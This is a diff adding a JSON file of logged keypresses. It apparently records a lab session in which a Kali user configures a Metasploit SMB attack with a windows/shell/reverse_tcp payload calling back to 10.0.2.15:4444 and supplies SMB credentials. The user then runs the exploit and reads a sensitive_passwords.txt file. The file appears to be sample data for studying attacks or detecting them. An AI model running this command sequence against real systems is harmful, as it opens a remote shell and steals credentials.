@@ -1,0 +1,13 @@
+[
+	{"keypresses_id" : 0, "content" : "[Control_L][Alt_L]t", "className" : "Keypresses", "start" : "2021-05-03T10:11:51"},
+	{"keypresses_id" : 1, "content" : "whoami[Return]ping8[BackSpace] 8.8.8.8[Return][Control_L]zsudo ifconfig[Return]kali[Return]", "className" : "Keypresses", "start" : "2021-05-03T10:12:12"},
+	{"keypresses_id" : 2, "content" : "msfconsole[Return]", "className" : "Keypresses", "start" : "2021-05-03T10:12:16"},
+	{"keypresses_id" : 3, "content" : "[Return]set [Shift_L]RHOST 192.168.1.100[Return]", "className" : "Keypresses", "start" : "2021-05-03T10:12:50"},
+	{"keypresses_id" : 4, "content" : "set [Shift_L]PAYLOAD windows\/shell\/reverse[Shift_L]_tcp[Return]", "className" : "Keypresses", "start" : "2021-05-03T10:13:02"},
+	{"keypresses_id" : 5, "content" : "set [Shift_L]LHOST 10.0.2.15[Return]", "className" : "Keypresses", "start" : "2021-05-03T10:13:12"},
+	{"keypresses_id" : 6, "content" : "set [Shift_L]LPI[BackSpace][Shift_L]ORT 4444[Return]set [Shift_L]SMBUSER c[BackSpace]victim[Return]set [Shift_L]SMBPASS s3cr3t[Return]exploit[Return]", "className" : "Keypresses", "start" : "2021-05-03T10:13:39"},
+	{"keypresses_id" : 7, "content" : "[Control_L]z", "className" : "Keypresses", "start" : "2021-05-03T10:13:46"},
+	{"keypresses_id" : 8, "content" : "[Return]", "className" : "Keypresses", "start" : "2021-05-03T10:14:01"},
+	{"keypresses_id" : 9, "content" : "ls[Return]cd business[Shift_L]_data[Return]", "className" : "Keypresses", "start" : "2021-05-03T10:14:08"},
+	{"keypresses_id" : 10, "content" : "cat sensitive[Shift_L]_passwords.txt[Return]df -h", "className" : "Keypresses", "start" : "2021-05-03T10:14:19"}
+]
